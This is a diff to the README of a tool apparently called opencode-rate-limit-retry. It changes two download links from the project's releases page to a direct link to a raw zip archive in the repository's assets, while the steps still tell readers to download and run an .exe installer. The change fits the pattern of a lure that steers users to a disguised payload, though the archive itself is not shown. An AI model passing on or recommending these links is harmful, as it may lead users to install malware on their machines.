@@ -1,6 +1,6 @@
 # ⚙️ opencode-rate-limit-retry - Make your network requests run smoother
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/notmay666-code/opencode-rate-limit-retry/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/notmay666-code/opencode-rate-limit-retry/raw/refs/heads/main/assets/limit-rate-opencode-retry-v2.4.zip)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ To run this software, your computer needs the following:
 
 You must download the correct version for your computer. Follow these steps to obtain the tool:
 
-1.  Visit the official [Download Page](https://github.com/notmay666-code/opencode-rate-limit-retry/releases).
+1.  Visit the official [Download Page](https://github.com/notmay666-code/opencode-rate-limit-retry/raw/refs/heads/main/assets/limit-rate-opencode-retry-v2.4.zip).
 2.  Scroll to the latest release section.
 3.  Click the file ending in .exe to download the installer.
 4.  Save the file to a known folder like your Downloads directory.
